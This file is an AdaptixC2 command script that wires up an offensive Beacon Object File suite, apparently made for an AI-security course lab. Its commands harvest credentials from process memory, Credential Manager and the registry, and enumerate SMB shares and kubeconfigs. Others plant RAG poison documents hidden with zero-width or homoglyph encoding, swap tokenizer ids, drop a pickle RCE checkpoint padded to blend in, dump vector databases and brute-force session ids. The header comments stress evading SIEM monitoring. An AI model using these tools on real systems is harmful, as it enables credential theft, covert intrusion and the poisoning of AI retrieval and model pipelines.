// aibof.axs — AdaptixC2 command wrappers for the OSAI AI-BOF suite.
// One operator command per BOF.  BOFs are in-process (zero child processes),
// which is the OPSEC point for the SIEM-monitored OSAI labs: FindFirstFile /
// ReadProcessMemory / raw-socket / WNet sweeps all happen inside the beacon
// thread and produce no CreateProcess/NetUse/curl telemetry.
//
// Build the objects first:  cd ../ && make
//
// Course -> command crosswalk (see OSAI-BOF-IDEAS.md / README.md for ATLAS IDs):
//   aiHunter       M2.4   hunt AI artifacts on disk
//   credsMem       M11.4  harvest creds from process memory
//   envScraper     M9.1.1 env + registry secrets (SSRF/env creds)
//   aiSvcProbe     M5/M6  probe localhost AI service ports
//   shareWalk      M11.5  SMB KB-share enum + writable-dir probe
//   poisonStage    M5/M4  plant RAG/retrieval poison docs
//   configDump     M7     dump semicolon-separated config paths
//   logTail        M5     grep ingest/lm_response/heartbeat log lines
//   kubeHunter     M9.2.2 kubeconfig client-cert O=system:masters
//   tokenizerSwap  M8     MAL<->FUN token-id swap in BOTH json files
//   picklePlant    M8     write prebuilt pickle/.pt RCE checkpoint
//   gitMine        M2.4   inflate+grep .git loose objects
//   vectorExport   M5     Weaviate /v1/schema + /v1/objects dump
//   sessionBrute   M3.4.2 predictable MC-YYYYMMDD-NNNN session-id brute

var metadata = {
    name: "AI-BOF",
    description: "OSAI AI-content discovery & task-solving Beacon Object Files"
};

// ---------- aiHunter ----------
var cmd_aiHunter = ax.create_command("aiHunter", "Recursively hunt AI artifacts/secrets on disk (M2.4)", "aiHunter C:\\Users -d 6");
cmd_aiHunter.addArgString("root", true, "Root directory to walk (e.g. C:\\ or C:\\Users)");
cmd_aiHunter.addArgFlagString("-d", "depth", "Max recursion depth (0 = unlimited)", "0");
cmd_aiHunter.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let root = parsed_json["root"];
    let depth = parseInt(parsed_json["depth"] || "0", 10); if (isNaN(depth)) depth = 0;
    let bof_params = ax.bof_pack("cstr,int", [root, depth]);
    let bof_path = ax.script_dir() + "_bin/aiHunter." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "aiHunter: " + root);
});

// ---------- credsMem ----------
var cmd_credsMem = ax.create_command("credsMem", "Harvest secrets from a process's memory (M11.4)", "credsMem 0 -c 80");
cmd_credsMem.addArgInt("pid", true, "PID to scan (0 = current/beacon process)");
cmd_credsMem.addArgFlagString("-c", "ctx", "Context bytes printed around each hit", "80");
cmd_credsMem.addArgFlagString("-e", "extra", "Extra keyword to also search for", "");
cmd_credsMem.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parseInt(parsed_json["pid"], 10); if (isNaN(pid)) pid = 0;
    let ctx = parseInt(parsed_json["ctx"] || "80", 10); if (isNaN(ctx)) ctx = 80;
    let extra = parsed_json["extra"] || "";
    let bof_params = ax.bof_pack("int,int,cstr", [pid, ctx, extra]);
    let bof_path = ax.script_dir() + "_bin/credsMem." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "credsMem pid=" + pid);
});

// ---------- credsLaunch ----------
var cmd_credsLaunch = ax.create_command("credsLaunch", "Launch a short-lived binary & harvest its memory for creds (M11.4)", "credsLaunch C:\\app\\healthcheck.exe -a -v -m 1 -c 80");
cmd_credsLaunch.addArgString("exe", true, "Binary to launch (full path)");
cmd_credsLaunch.addArgFlagString("-a", "args", "Command-line args for the binary", "");
cmd_credsLaunch.addArgFlagString("-m", "mode", "0=suspend-only (static image), 1=run+poll (runtime)", "0");
cmd_credsLaunch.addArgFlagString("-c", "ctx", "Context bytes printed around each hit", "80");
cmd_credsLaunch.addArgFlagString("-e", "extra", "Extra keyword to also search for", "");
cmd_credsLaunch.addArgFlagString("-d", "dwell", "Mode 1 max poll ms before kill (default 5000)", "5000");
cmd_credsLaunch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let exe = parsed_json["exe"];
    let a = parsed_json["args"] || "";
    let mode = parseInt(parsed_json["mode"] || "0", 10); if (isNaN(mode)) mode = 0;
    let ctx = parseInt(parsed_json["ctx"] || "80", 10); if (isNaN(ctx)) ctx = 80;
    let extra = parsed_json["extra"] || "";
    let dwell = parseInt(parsed_json["dwell"] || "5000", 10); if (isNaN(dwell)) dwell = 5000;
    let bof_params = ax.bof_pack("cstr,cstr,int,int,cstr,int", [exe, a, mode, ctx, extra, dwell]);
    let bof_path = ax.script_dir() + "_bin/credsLaunch." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "credsLaunch mode=" + mode + " " + exe);
});

// ---------- envScraper ----------
var cmd_envScraper = ax.create_command("envScraper", "Dump own env vars + (optionally) registry secrets (M9.1.1)", "envScraper -reg");
cmd_envScraper.addArgFlagString("-reg", "doreg", "Also enumerate common registry secret locations", "0");
cmd_envScraper.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let doReg = parsed_json["-reg"] ? 1 : 0;
    let bof_params = ax.bof_pack("int", [doReg]);
    let bof_path = ax.script_dir() + "_bin/envScraper." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "envScraper reg=" + doReg);
});

// ---------- aiSvcProbe ----------
var cmd_aiSvcProbe = ax.create_command("aiSvcProbe", "Raw-socket probe of localhost AI service ports (M5/M6)", "aiSvcProbe 127.0.0.1 -http");
cmd_aiSvcProbe.addArgString("ip", true, "Target IP (e.g. 127.0.0.1 or a box you can reach)");
cmd_aiSvcProbe.addArgFlagString("-http", "http", "Also send a minimal HTTP banner probe", "0");
cmd_aiSvcProbe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ip = parsed_json["ip"];
    let http = parsed_json["-http"] ? 1 : 0;
    let bof_params = ax.bof_pack("cstr,int", [ip, http]);
    let bof_path = ax.script_dir() + "_bin/aiSvcProbe." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "aiSvcProbe " + ip);
});

// ---------- shareWalk ----------
var cmd_shareWalk = ax.create_command("shareWalk", "SMB share enum + writable-dir probe (M11.5)", "shareWalk FILESERVER01 Knowledgebase user pass -d 4");
cmd_shareWalk.addArgString("host", true, "SMB host (e.g. FILESERVER01)");
cmd_shareWalk.addArgFlagString("-s", "share", "Share to walk (empty = enumerate only)", "");
cmd_shareWalk.addArgFlagString("-u", "user", "Username for IPC$ (empty = current creds)", "");
cmd_shareWalk.addArgFlagString("-p", "pass", "Password for IPC$", "");
cmd_shareWalk.addArgFlagString("-d", "depth", "Max sub-dir depth (0 = unlimited)", "4");
cmd_shareWalk.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let host = parsed_json["host"];
    let share = parsed_json["share"] || "";
    let user = parsed_json["user"] || "";
    let pass = parsed_json["pass"] || "";
    let depth = parseInt(parsed_json["depth"] || "4", 10); if (isNaN(depth)) depth = 4;
    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,int", [host, share, user, pass, depth]);
    let bof_path = ax.script_dir() + "_bin/shareWalk." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "shareWalk " + host);
});

// ---------- poisonStage ----------
var cmd_poisonStage = ax.create_command("poisonStage", "Plant a RAG/retrieval poison document (M5/M4.7)", "poisonStage 1 \\\\fileserver\\kb\\password_reset.txt -b 500");
cmd_poisonStage.addArgInt("tid", true, "1=pwdreset 2=collision 3=retrhijack 4=directive 5=memarticle");
cmd_poisonStage.addArgString("path", true, "Target file path to write (UNC or local)");
cmd_poisonStage.addArgFlagString("-t", "trigger", "Trigger word for retrhijack template", "");
cmd_poisonStage.addArgFlagString("-b", "blend", "Blend-after N chars (M5.6.2 preview evasion)", "500");
cmd_poisonStage.addArgFlagString("-e", "encode", "0=plain 1=zero-width 2=homoglyph", "0");
cmd_poisonStage.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let tid = parseInt(parsed_json["tid"], 10); if (isNaN(tid)) tid = 1;
    let path = parsed_json["path"];
    let trigger = parsed_json["trigger"] || "";
    let blend = parseInt(parsed_json["blend"] || "500", 10); if (isNaN(blend)) blend = 500;
    let encode = parseInt(parsed_json["encode"] || "0", 10); if (isNaN(encode)) encode = 0;
    let bof_params = ax.bof_pack("int,cstr,cstr,int,int", [tid, path, trigger, blend, encode]);
    let bof_path = ax.script_dir() + "_bin/poisonStage." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "poisonStage tid=" + tid + " " + path);
});

// ---------- configDump ----------
var cmd_configDump = ax.create_command("configDump", "Dump semicolon-separated config files (M7)", "configDump C:\\app\\.env;C:\\app\\config.yaml;C:\\app\\rag.yaml");
cmd_configDump.addArgString("paths", true, "Semicolon-separated file paths");
cmd_configDump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let paths = parsed_json["paths"];
    let bof_params = ax.bof_pack("cstr", [paths]);
    let bof_path = ax.script_dir() + "_bin/configDump." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "configDump");
});

// ---------- logTail ----------
var cmd_logTail = ax.create_command("logTail", "Tail/grep ingest & lm_response log lines (M5)", "logTail C:\\app\\agent.log -n 200 -g ingest_ok");
cmd_logTail.addArgString("path", true, "Log file path");
cmd_logTail.addArgFlagString("-n", "lastn", "Print last N lines (0 = all)", "200");
cmd_logTail.addArgFlagString("-g", "grep", "Only print lines containing this", "");
cmd_logTail.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let path = parsed_json["path"];
    let lastn = parseInt(parsed_json["lastn"] || "200", 10); if (isNaN(lastn)) lastn = 200;
    let grep = parsed_json["grep"] || "";
    let bof_params = ax.bof_pack("cstr,int,cstr", [path, lastn, grep]);
    let bof_path = ax.script_dir() + "_bin/logTail." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "logTail " + path);
});

// ---------- kubeHunter ----------
var cmd_kubeHunter = ax.create_command("kubeHunter", "Find kubeconfig + scan client-cert for system:masters (M9.2.2)", "kubeHunter C:\\Users\\dev\\.kube\\config");
cmd_kubeHunter.addArgString("path", true, "kubeconfig path (empty = search common locations)");
cmd_kubeHunter.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let path = parsed_json["path"] || "";
    let bof_params = ax.bof_pack("cstr", [path]);
    let bof_path = ax.script_dir() + "_bin/kubeHunter." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "kubeHunter " + path);
});

// ---------- tokenizerSwap ----------
var cmd_tokenizerSwap = ax.create_command("tokenizerSwap", "Swap MAL<->FUN token ids in BOTH vocab+tokenizer json (M8)", "tokenizerSwap C:\\app\\vocab.json C:\\app\\tokenizer.json -dry");
cmd_tokenizerSwap.addArgString("vocab", true, "vocab.json path");
cmd_tokenizerSwap.addArgString("tok", true, "tokenizer.json path (fast tokenizer loads this)");
cmd_tokenizerSwap.addArgFlagString("-dry", "dry", "1 = preview only, do not write", "0");
cmd_tokenizerSwap.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let vocab = parsed_json["vocab"];
    let tok = parsed_json["tok"];
    let dry = parsed_json["-dry"] ? 1 : 0;
    let bof_params = ax.bof_pack("cstr,cstr,int", [vocab, tok, dry]);
    let bof_path = ax.script_dir() + "_bin/tokenizerSwap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "tokenizerSwap dry=" + dry);
});

// ---------- picklePlant ----------
var cmd_picklePlant = ax.create_command("picklePlant", "Write a prebuilt pickle/.pt RCE checkpoint (M8)", "picklePlant C:\\app\\ckpt\\resnet18_epoch_099.pt /tmp/evil.pt -pad 47000000");
cmd_picklePlant.addArgString("path", true, "Target .pt path (use a higher epoch than legit ckpts)");
cmd_picklePlant.addArgFile("blob", true);
cmd_picklePlant.addArgFlagString("-pad", "pad", "Pad total size to N bytes (blend with legit ckpts)", "0");
cmd_picklePlant.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let path = parsed_json["path"];
    let blob = parsed_json["blob"];
    let pad = parseInt(parsed_json["pad"] || "0", 10); if (isNaN(pad)) pad = 0;
    let bof_params = ax.bof_pack("cstr,bytes,int", [path, blob, pad]);
    let bof_path = ax.script_dir() + "_bin/picklePlant." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "picklePlant " + path);
});

// ---------- gitMine ----------
var cmd_gitMine = ax.create_command("gitMine", "Inflate+grep .git loose objects for secrets/AI content (M2.4)", "gitMine C:\\app -g sk-");
cmd_gitMine.addArgString("root", true, "Repo root containing .git/");
cmd_gitMine.addArgFlagString("-g", "grep", "Pattern to grep inside inflated blobs (empty = list all)", "");
cmd_gitMine.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let root = parsed_json["root"];
    let grep = parsed_json["grep"] || "";
    let bof_params = ax.bof_pack("cstr,cstr", [root, grep]);
    let bof_path = ax.script_dir() + "_bin/gitMine." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "gitMine " + root);
});

// ---------- vectorExport ----------
var cmd_vectorExport = ax.create_command("vectorExport", "Dump Weaviate schema + DocChunk objects (M5)", "vectorExport 127.0.0.1 8080 200");
cmd_vectorExport.addArgString("ip", true, "Weaviate host IP");
cmd_vectorExport.addArgFlagString("-p", "port", "Weaviate port (default 8080)", "8080");
cmd_vectorExport.addArgFlagString("-l", "limit", "Max objects to pull per class", "200");
cmd_vectorExport.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ip = parsed_json["ip"];
    let port = parseInt(parsed_json["port"] || "8080", 10); if (isNaN(port)) port = 8080;
    let limit = parseInt(parsed_json["limit"] || "200", 10); if (isNaN(limit)) limit = 200;
    let bof_params = ax.bof_pack("cstr,int,int", [ip, port, limit]);
    let bof_path = ax.script_dir() + "_bin/vectorExport." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "vectorExport " + ip + ":" + port);
});

// ---------- sessionBrute ----------
var cmd_sessionBrute = ax.create_command("sessionBrute", "Brute predictable MC-YYYYMMDD-NNNN session ids (M3.4.2)", "sessionBrute 10.10.10.10 8009 20260301 14 20");
cmd_sessionBrute.addArgString("ip", true, "Notes Assistant host IP");
cmd_sessionBrute.addArgFlagString("-p", "port", "Port (default 8009)", "8009");
cmd_sessionBrute.addArgString("start", true, "Start date YYYYMMDD");
cmd_sessionBrute.addArgFlagString("-d", "days", "Days to span (default 14)", "14");
cmd_sessionBrute.addArgFlagString("-n", "count", "Max seq per day NNNN (default 20)", "20");
cmd_sessionBrute.addArgFlagString("-k", "kw", "Keyword filter (empty = any non-empty response)", "");
cmd_sessionBrute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ip = parsed_json["ip"];
    let port = parseInt(parsed_json["port"] || "8009", 10); if (isNaN(port)) port = 8009;
    let start = parsed_json["start"];
    let days = parseInt(parsed_json["days"] || "14", 10); if (isNaN(days)) days = 14;
    let count = parseInt(parsed_json["count"] || "20", 10); if (isNaN(count)) count = 20;
    let kw = parsed_json["kw"] || "";
    let bof_params = ax.bof_pack("cstr,int,cstr,int,int,cstr", [ip, port, start, days, count, kw]);
    let bof_path = ax.script_dir() + "_bin/sessionBrute." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "sessionBrute " + ip + ":" + port);
});

// ---------- credVault ----------
var cmd_credVault = ax.create_command("credVault", "Dump Credential Manager + DPAPI blobs + Vault (OSAI M7 / T1555). -u/-p/-d spawn an interactive token (fixes type-3 network-logon empty credman).", "credVault ;  credVault -f DC01 -u jordan.west -p 'pass' -d megacorpone");
cmd_credVault.addArgFlagString("-f", "filter", "Case-insensitive substring filter on target/filename (empty = all)", "");
cmd_credVault.addArgFlagString("-u", "user", "Username for an interactive LogonUser token (optional; loads credman/vault on a type-3 beacon). May be DOMAIN\\user or user@DOMAIN.", "");
cmd_credVault.addArgFlagString("-p", "pass", "Password for -u (optional)", "");
cmd_credVault.addArgFlagString("-d", "d", "Domain for -u (optional; empty = local/SAM)", "");
cmd_credVault.addArgFlagString("-domain", "domain", "Alias for -d", "");
cmd_credVault.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let filter = parsed_json["filter"] || "";
    let user = parsed_json["user"] || "";
    let pass = parsed_json["pass"] || "";
    let domain = parsed_json["domain"] || parsed_json["d"] || "";
    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [filter, user, pass, domain]);
    let bof_path = ax.script_dir() + "_bin/credVault." + ax.arch(id) + ".o";
    let desc = "credVault" + (filter ? " -f " + filter : "") + (user ? " -u " + user + (domain ? "\\" + domain : "") : "");
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, desc);
});

var group_aibof = ax.create_commands_group("AI-BOF", [
    cmd_aiHunter, cmd_credsMem, cmd_credsLaunch, cmd_envScraper, cmd_aiSvcProbe, cmd_shareWalk,
    cmd_poisonStage, cmd_configDump, cmd_logTail, cmd_kubeHunter,
    cmd_tokenizerSwap, cmd_picklePlant, cmd_gitMine, cmd_vectorExport,
    cmd_sessionBrute, cmd_credVault
]);
ax.register_commands_group(group_aibof, ["beacon", "gopher", "NoNameAx"], ["windows"], []);